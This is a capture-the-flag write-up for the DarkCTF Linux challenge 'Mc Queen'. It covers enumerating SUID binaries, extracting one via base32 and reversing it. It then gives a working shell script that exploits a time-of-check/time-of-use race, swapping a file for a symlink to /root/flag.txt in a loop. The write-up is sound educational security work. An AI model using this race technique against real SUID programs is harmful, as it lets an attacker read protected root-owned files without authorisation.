# Mc Queen (15 solves) 489 points #

This was a linux task in DarkCTF, it was a great task and had too much fun solving it! 

![TASK](https://imgur.com/h2yyNZZ.png)


We have ssh credentials like always and every user has a separate container ( I was so glad to see that my solution to enable separate environments has really been beneficial for the community)
,however connecting to the server we find a note telling us that enumeration is the key so i started doing some basic stuffs and searched if there are any SUID binaries 
by running the following command :

```sh
find / -perm -u=s -type f 2>/dev/null
```

![TASK](https://imgur.com/g0yVsID.png)

Bingo we find the following SUID binary : ``` /usr/bin/win_or_lose ```

My next step was to extract this binary in order to reverse it, i used the following steps:

* Encoded the binary in base32: ``` base32 /usr/bin/win_or_lose ```
* Copied the result and decoded it locally ``` cat base32_res|tr -d "\n"|base32 -d > bin ```

Now after statically analyzing the binary with Ghidra , we can deduct the following:

![TASK](https://imgur.com/DZQEcHV.png)

The binary is used to read the content of a file we specify in the arguments, but it checks firstly the owner of the file and if it's root it exits and never show its content.

I tried to use a symlink that points to the flag.txt file but in vain, stat function always check the properties of the real file and follow symlinks. I got stuck here for some time trying to figure out how we can bypass this check and after a little bit of concentration
I observed that the binary is checking for the owner before actually opening the file, so if we give it first a big file it will take a non negligeable time to check its owner and then in this short amount of time we can replace
that big file with a symlink to the flag! I think you guessed it , it's time for TOCTU (time of check - time of use) exploitation , let's try to win the race.

I wrote the following script to exploit this weakness:

```sh
#!/bin/bash
perl -e 'print "a"x20x1000x1000' >bigfile
chmod 777 bigfile
/usr/bin/win_or_lose bigfile &
ln -sf /root/flag.txt bigfile
```
I wrote it in the server using some cat tricks:

```sh
cat >exp.sh <<EOF
EXPLOIT HERE
#Write EOF to close stdout
```

And finally i run my exploit in an infinite loop:

```sh
while true;do ./exp.sh|grep -i dark;rm bigfile;done
```

Et Voilaa

![TASK](https://imgur.com/hRIMxmc.png)

If you have any questions you can ask me on twitter @belkahlaahmed1 , for more cybersecurity related articles you can visit my personal **[blog](https://ahmed-belkahla.me)** 
